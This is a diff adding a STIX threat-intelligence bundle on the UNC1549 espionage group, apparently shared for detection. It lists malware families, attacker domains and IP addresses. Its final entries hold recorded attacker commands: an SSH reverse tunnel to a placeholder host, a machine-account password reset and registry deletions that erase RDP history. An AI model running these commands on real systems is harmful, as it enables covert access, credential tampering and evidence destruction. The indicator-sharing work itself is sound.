@@ -1,0 +1,628 @@
+{
+  "type": "bundle",
+  "id": "bundle--1aed02fc-6ccf-40fb-a182-66f9e2476918",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "intrusion-set",
+      "id": "intrusion-set--90b2e287-669c-40ce-95d2-77e1ca06523f",
+      "name": "UNC1549",
+      "aliases": [
+        "UNC1549"
+      ],
+      "description": "UNC1549 is a suspected Iran-nexus threat group targeting the aerospace, aviation, and defense industries in the Middle East and beyond. The group employs a dual approach for initial access, including targeted phishing and exploitation of trusted third-party relationships. UNC1549 is known for sophisticated lateral movement, custom malware deployment, and long-term persistence.",
+      "first_seen": "2023-10-01T00:00:00Z",
+      "goals": [
+        "Espionage",
+        "Credential theft",
+        "Long-term persistence",
+        "Data exfiltration"
+      ],
+      "resource_level": "organization",
+      "primary_motivation": "espionage",
+      "secondary_motivations": [
+        "credential access",
+        "defense evasion"
+      ]
+    },
+    {
+      "type": "tool",
+      "id": "tool--65e9725f-da0b-42e2-8871-a54ad0d9ae03",
+      "name": "Atelier Web Remote Commander (AWRC)",
+      "description": "AWRC is a commercial utility for remotely managing, auditing, and supporting Windows systems. UNC1549 used AWRC for remote connections, reconnaissance, credential theft, and malware deployment post-compromise.",
+      "tool_types": [
+        "remote access",
+        "reconnaissance",
+        "credential access"
+      ],
+      "aliases": [
+        "AWRC"
+      ],
+      "labels": [
+        "commercial",
+        "agentless"
+      ]
+    },
+    {
+      "type": "tool",
+      "id": "tool--49e7a53b-a58c-44c8-96d3-a2179f31f482",
+      "name": "SCCMVNC",
+      "description": "SCCMVNC is a tool that leverages Microsoft System Center Configuration Manager's Remote Control feature to achieve VNC-like remote access without requiring user consent or notifications. UNC1549 used SCCMVNC for discreet remote access and lateral movement.",
+      "tool_types": [
+        "remote access",
+        "lateral movement"
+      ],
+      "labels": [
+        "open-source"
+      ]
+    },
+    {
+      "type": "file",
+      "id": "file--d92349ab-ca67-48ce-b3d7-e6c7add59283",
+      "name": "LOG.txt",
+      "path": "C:\\users\\public\\LOG.txt"
+    },
+    {
+      "type": "file",
+      "id": "file--0c906828-ed77-4ab2-af3d-3cac616c4f80",
+      "name": "LOG.txt",
+      "path": "C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\LOG.txt"
+    },
+    {
+      "type": "file",
+      "id": "file--80d0eb7a-6f7b-4840-afd5-b9efe3477ccd",
+      "name": "crash.log",
+      "path": "C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\crash.log"
+    },
+    {
+      "type": "file",
+      "id": "file--6293b9ba-6869-4afc-86ab-12acbec06eb2",
+      "name": "config.txt",
+      "path": "C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\config.txt"
+    },
+    {
+      "type": "file",
+      "id": "file--053c0ab1-f209-406a-959c-5660b4298740",
+      "name": "1.jpg",
+      "path": "C:\\Users\\Public\\Videos\\2025-3-7-10-17\\1.jpg"
+    },
+    {
+      "type": "file",
+      "id": "file--3353f54e-c627-4d16-bf94-420ba14c4f12",
+      "name": "2.jpg",
+      "path": "C:\\Users\\Public\\Videos\\2025-3-7-10-17\\2.jpg"
+    },
+    {
+      "type": "file",
+      "id": "file--f89d8d25-b1f0-42b7-8f30-cc203937ba55",
+      "name": "3.jpg",
+      "path": "C:\\Users\\Public\\Videos\\2025-3-7-10-17\\3.jpg"
+    },
+    {
+      "type": "file",
+      "id": "file--75257cd5-25f7-48ff-8143-347874fd5e9e",
+      "name": "1.jpg",
+      "path": "C:\\Users\\Public\\Music\\2025-3-7-10-17\\1.jpg"
+    },
+    {
+      "type": "file",
+      "id": "file--636cf4a2-9fc2-4e11-af10-995144b1e7cb",
+      "name": "2.jpg",
+      "path": "C:\\Users\\Public\\Music\\2025-3-7-10-17\\2.jpg"
+    },
+    {
+      "type": "file",
+      "id": "file--184a7f1a-efcc-4ebe-9a11-65e51959018e",
+      "name": "3.jpg",
+      "path": "C:\\Users\\Public\\Music\\2025-3-7-10-17\\3.jpg"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--b902a986-5f06-4183-a712-4c2cbe566cba",
+      "value": "104.194.215.88"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--b5461ee2-1d49-468f-aea7-828c03a6edf5",
+      "value": "13.60.50.172"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--b4954bb6-8d81-4663-acac-aa9f031d64f0",
+      "value": "167.172.137.208"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--1865b63f-8bcb-47f0-99c9-84509fba4ffd",
+      "value": "34.18.42.26"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--1e4aefe1-7b09-4ac3-9bee-9fbf54975691",
+      "value": "4.188.75.206"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--42609f89-7e43-4fb4-8641-e0949bf4b16c",
+      "value": "4.240.113.27"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--48ff7cc7-08e9-4152-9f77-108ef1ace19f",
+      "value": "40.119.176.233"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--f07e1b19-e1dd-4666-8f2e-93ae425c98ac",
+      "value": "46.31.115.92"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--e7c077b0-275a-4d86-9fab-662f2d4925bd",
+      "value": "politicalanorak.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--c87fde07-bb9f-493e-8043-0b3f42a73b60",
+      "value": "ac-connection-status105.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--95d714be-ac61-4d5b-ba0a-5885c8e0788b",
+      "value": "acc-cloud-connection.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--83734e9d-ceba-4124-855d-3df578a54f2c",
+      "value": "active-az-check-status45.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--ab547549-da09-4478-b82a-d03968455153",
+      "value": "active-az-check-status675.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--b731fe46-3c8b-4772-a25d-834eb67375e0",
+      "value": "active-az-status45.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--fff9ec05-8c09-469d-85d6-d06e256651df",
+      "value": "active-az-status795.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--ffec9f65-66e5-444d-b62c-a4667e429db5",
+      "value": "active-internal-log65.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--7237e6a8-de93-4730-85a2-ce0ce7df126f",
+      "value": "active-internal-logs.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--43792d3e-5ab0-4b91-859d-38cdee301fd4",
+      "value": "active-intranet-logs.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--078bf2f8-1a13-40e1-af2f-62fa5eb7ef79",
+      "value": "airbus.usa-careers.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--1785c7e1-fd02-4b32-be00-41ac72cf0f58",
+      "value": "airlinecontrolsite.uaenorth.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--38be2b1b-4698-4dcd-928d-ade9f57952e1",
+      "value": "airlinecontrolsite.westus3.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--9c64f257-e47f-43f5-a531-7e1226261a63",
+      "value": "airplaneserviceticketings.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--c7692115-9693-4cc8-a671-f15a51eec42e",
+      "value": "airseatregister.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--80f59bfb-d653-47d9-a577-8a8bc75420fb",
+      "value": "airseatsregister.qatarcentral.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--d2c85b90-19ae-43f2-bddc-51ea7bf173f2",
+      "value": "airseatsregistering.qatarcentral.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--48a68b06-11bf-4853-988e-929cd609ea03",
+      "value": "airtravellog.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--51b44b15-966f-4657-8795-407e2d4c28b0",
+      "value": "automationagencybusiness.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--b032a3e0-60b1-4697-bfa9-cb2af5b680ff",
+      "value": "automationagencybusiness.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--fd023bdd-7bd3-44d3-8da7-ef34834a7d74",
+      "value": "browsercheckap.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--82a1faa5-105f-4f22-a500-a069e5bbd5dd",
+      "value": "codesparkle.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--9c6bed75-cf78-4f67-85bd-5d205f9b3934",
+      "value": "connect-acc-492.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--00d4b8fd-fc4b-46a2-b79d-134b6dc689f3",
+      "value": "connect-acl-492.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--c44e2f42-f33f-49d3-9d15-b1ad0b726206",
+      "value": "customerlistchange.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--01d4fbcf-40c1-4b1b-a37a-7d30fb2a62f8",
+      "value": "developercodepro.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--9ca1255f-d649-42f7-84ba-60d8caf32b8d",
+      "value": "developercodevista.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--c353a58d-9c37-455d-bce4-78c65f066f29",
+      "value": "dreamtiniventures.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--ae7508ab-1d89-4242-aaad-1c464a10cad8",
+      "value": "fdtsprobusinesssolutions.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--f3fe1a99-57ed-4b09-9bdf-81896b10f648",
+      "value": "fdtsprobusinesssolutions.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--d5a900e0-b0b9-432d-910f-880567a9de6b",
+      "value": "fdtsprobusinesssolutions.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--70c71fca-5a22-447c-beb0-d146ad992e83",
+      "value": "fdtsprobusinesssolutions.northeurope.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--59c1ae3c-e9d1-4936-a46c-83b7ea528ee7",
+      "value": "forcecodestore.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--26de082a-dc46-4ebe-afe6-7c59afc530a4",
+      "value": "hserbhh43.westus3.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--2d092aa8-a514-481d-92b2-529cc8832253",
+      "value": "infrasync-ac372.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--db206414-ea77-4fc7-9e2c-bd3e78a743cd",
+      "value": "intra-az-check-status45.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--db6883f3-53cc-477a-a27f-9b33f00b073c",
+      "value": "intra-az-check-status675.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--0a537edf-f1f8-47b2-9fd8-08003bc16a1d",
+      "value": "intra-az-status45.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--3190a7d4-be92-483c-9065-eb94d4449f94",
+      "value": "intra-az-status795.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--e750b3b1-bdbe-4d61-a90e-4142f2bc21b8",
+      "value": "masterflexiblecloud.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--1c3bbe7b-07a0-47a0-9db4-6049da7fc6d7",
+      "value": "mso-internal-log65.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--261a2a5c-5424-406f-9164-209d45daff08",
+      "value": "mso-internal-logs.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--db68ccaf-1750-431a-92f7-df6a79e54503",
+      "value": "mso-intranet-logs.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--c0afd954-4dc1-4617-b5fa-472aa902619d",
+      "value": "mydocs.qatarcentral.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--90148dc6-85bb-4bee-9331-fce8e05c7e17",
+      "value": "nx425-win4945.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--e66cf562-9821-49b7-b471-61de96c336e3",
+      "value": "nx4542-win4957.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--2e62fe97-a3c2-4a96-8d91-ff407a195cfc",
+      "value": "nxlog-crash-1567.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--94b6483b-84b7-4a5e-9f61-3af800e4818d",
+      "value": "nxlog-win-1567.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--4018c1a7-9653-4223-8e35-4314397163cf",
+      "value": "nxversion-win-1567.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--34d8065b-c4dc-48be-8d19-61aa993fda29",
+      "value": "nxversion-win32-1127.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--872af09d-b506-4bc0-855e-4f8e0d7b2cba",
+      "value": "overqatfa.northeurope.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--35646306-f8d8-4424-9b7f-9deb873f45fc",
+      "value": "queuetestapplication.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--fb315303-2aca-4924-8bce-5756de8e33c2",
+      "value": "skychain13424.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--1e4c8c62-de15-4597-9786-03786e6d6cc5",
+      "value": "skychain41334.northeurope.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--6a2170e0-6a66-4b87-8ff9-2b0f0352e93e",
+      "value": "skychains42745.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--b478a324-c546-4a47-b7be-781fc5bed632",
+      "value": "skyticketgrant.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--57fd96db-3efa-4ba6-b910-cec8ae48b2c2",
+      "value": "snare-core.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--14b99de4-0537-43e3-a318-c12275c382db",
+      "value": "storageboxcloud.northeurope.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--26d6ba07-4b56-42a4-9805-158d0809aeb2",
+      "value": "storagewiz.co.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--bc311301-ff1f-46a1-9fda-91f3b0d75304",
+      "value": "swiftcode.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--8d5fe31f-d1f3-4772-8913-98c35e01b529",
+      "value": "swifttiniventures.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--b14e94dd-e311-4699-87f5-0e1b58685a74",
+      "value": "terratechworld.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--5526f5fe-8574-4545-a96f-7feab0d498ab",
+      "value": "thecloudappbox.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--4161cce0-4f05-4c44-b155-10d692945304",
+      "value": "thestorageboxcloud.northeurope.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--69ca3632-225a-4f0f-9803-070aff4d887a",
+      "value": "thetacticstore.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--f4444940-47d4-46d7-ae9b-cca7bf5631c1",
+      "value": "thevaultapp.westus3.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--7464dc26-30c2-4880-9e6f-c705a5d99b8d",
+      "value": "thevaultspace.eastus.cloudapp.azure.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--64fa8065-81a1-4e67-a342-9a7eee588282",
+      "value": "tini-ventures.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--871e2092-842c-4aca-806a-01c5ce227cb4",
+      "value": "vcphone-ms.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--47979081-4f85-42a2-b17b-b1e5701cc245",
+      "value": "vcs-news.com"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--c3ff6637-be01-43c6-9c10-1f5c2c86c43f",
+      "value": "vm-ticket-svc.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--6af81aef-715b-47a0-a280-5b1aaa49ba63",
+      "value": "vm-tools-svc.azurewebsites.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--e2537837-ef0b-4556-b764-ccc4c470a747",
+      "value": "vmware-health-ms.azurewebsites.net"
+    },
+    {
+      "type": "email-message",
+      "id": "email-message--9a27a371-ad6e-4c3c-bc19-0550657bdb0f",
+      "is_multipart": false,
+      "body": "Phishing email lure related to job opportunities or recruitment efforts, aiming to trick recipients into downloading and running malware hidden in attachments or links."
+    },
+    {
+      "type": "email-message",
+      "id": "email-message--709b5a8c-1225-4fb0-9841-6dac250f4c5d",
+      "is_multipart": false,
+      "body": "Phishing email mimicking password reset requests and internal company password reset webpages."
+    },
+    {
+      "type": "software",
+      "id": "software--e0436149-06cb-478f-b9b1-24a708cb9bd0",
+      "name": "TWOSTROKE",
+      "description": "C++ backdoor utilizing SSL-encrypted TCP/443 connections, supports system info collection, DLL loading, file manipulation, persistence."
+    },
+    {
+      "type": "software",
+      "id": "software--5a43bab0-e4fe-4a09-bdbf-6b8cd02059c5",
+      "name": "LIGHTRAIL",
+      "description": "Custom tunneler based on Socks4a proxy Lastenzug, communicates using Azure cloud infrastructure."
+    },
+    {
+      "type": "software",
+      "id": "software--d0cddca8-cece-4863-b7e8-cd356357b9c5",
+      "name": "DEEPROOT",
+      "description": "Linux backdoor written in Golang, supports shell command execution, system info enumeration, file listing, delete, upload, download."
+    },
+    {
+      "type": "software",
+      "id": "software--372836b6-189c-4c07-a5d9-db5e21942d8c",
+      "name": "GHOSTLINE",
+      "description": "Windows tunneler utility written in Golang, uses hard-coded domain for communication, uses go-yamux library."
+    },
+    {
+      "type": "software",
+      "id": "software--a92a78ad-e091-4429-8614-e3b9409acdb0",
+      "name": "POLLBLEND",
+      "description": "Windows tunneler written in C++, features hardcoded C2 servers and URI parameters for registration and configuration download."
+    },
+    {
+      "type": "software",
+      "id": "software--7025db86-4523-44aa-b270-34fd2ff49d75",
+      "name": "DCSYNCER.SLICK",
+      "description": "Windows executable based on DCSyncer and Mimikatz, collects and XOR-encrypts credentials before writing to hardcoded filename and path."
+    },
+    {
+      "type": "software",
+      "id": "software--4c90f30f-6e9c-4ef2-ae66-2eb2219cb07c",
+      "name": "CRASHPAD",
+      "description": "Windows executable written in C++, decrypts config.txt to crash.log by impersonating explorer.exe and using CryptUnprotectData API."
+    },
+    {
+      "type": "software",
+      "id": "software--78ee5871-3be8-45b3-bbea-79e280253360",
+      "name": "SIGHTGRAB",
+      "description": "Windows executable written in C, captures screenshots at intervals, saves to disk, uses XOR encryption to decode API names."
+    },
+    {
+      "type": "software",
+      "id": "software--7640bf33-f0ee-4248-8825-79f13d6ccaf1",
+      "name": "TRUSTTRAP",
+      "description": "Malware that serves Windows prompt to trick user into submitting credentials, saves captured credentials in cleartext to a file."
+    },
+    {
+      "type": "software",
+      "id": "software--80f909f3-b9b5-4755-a9ef-6e7d08ef203a",
+      "name": "Atelier Web Remote Commander (AWRC)",
+      "description": "Commercial utility for agentless remote management of Windows systems, used for reconnaissance, credential theft, and malware deployment."
+    },
+    {
+      "type": "software",
+      "id": "software--efac18e0-c46a-406c-8de3-0042ecefd3be",
+      "name": "SCCMVNC",
+      "description": "Tool leveraging SCCM Remote Control for VNC-like remote access, bypasses user consent/notification."
+    },
+    {
+      "type": "process",
+      "id": "process--e9c15fe4-fec6-452f-bfc0-78574beb54c0",
+      "command_line": "C:\\windows\\system32\\openssh\\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070"
+    },
+    {
+      "type": "process",
+      "id": "process--cc561888-7e54-4be7-a5bb-5a954cb08d47",
+      "command_line": "net user DC-01$ P@ssw0rd"
+    },
+    {
+      "type": "process",
+      "id": "process--69cc219d-f668-48ec-834d-b0123c4c0e7f",
+      "command_line": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f"
+    },
+    {
+      "type": "process",
+      "id": "process--ac017816-e215-461b-b66a-0479614e465b",
+      "command_line": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f"
+    },
+    {
+      "type": "process",
+      "id": "process--ebe0e160-e77d-4e6b-b93a-e35ab072dd95",
+      "command_line": "SCCM.exe reconfig /target:[REDACTED]"
+    }
+  ]
+}
